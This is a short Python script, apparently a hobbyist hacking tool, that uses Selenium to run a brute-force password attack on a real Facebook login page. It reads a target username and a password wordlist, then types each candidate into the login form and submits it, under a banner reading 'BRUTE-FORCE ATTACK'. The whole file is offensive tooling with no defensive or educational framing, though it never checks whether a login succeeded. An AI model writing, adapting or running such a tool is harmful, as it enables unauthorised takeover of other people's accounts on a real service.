from selenium import webdriver 
import sys
from selenium.webdriver.chrome.options import Options
from optparse import OptionParser
from colorama import Fore, Back


welcome_Message = '''

##################################################
###                                            ### 
###                                            ###
###     BRUTE-FORCE ATTACK -- WELCOME --       ###
###                                            ###
###                                            ###
##################################################

'''

print(Fore.RED + welcome_Message)



userDatas = OptionParser()

userDatas.add_option("-u",dest="username", 
                  help="username", default="admin")
userDatas.add_option("-p",
                  dest="password",
                  help="wordlist: for example password.txt")

(options, args) = userDatas.parse_args(sys.argv)

userName = options.username
wordlists = options.password

passwords = []


with open(wordlists, "r") as file:
    for data in file:
        passwords.append(data)



def Attack(userName, password):
    
    currUrl = driver.current_url
    driverUserName = driver.find_element_by_id("email")
    driverUserName.clear()
    driverUserName.send_keys(userName)

    driverPassword = driver.find_element_by_id("pass")
    driverPassword.clear()
    driverPassword.send_keys(password)

    driverButtonClicker = driver.find_element_by_id("loginbutton")

    driverButtonClicker.click()

    currUrlSec = driver.current_url



url = "https://tr-tr.facebook.com/login/device-based/regular/login/?login_attempt=1"
driver = webdriver.Chrome(executable_path=r"chromedriver")
chromeOptions = Options()
driver.get(url)


for datas in passwords:

    Attack(userName, datas)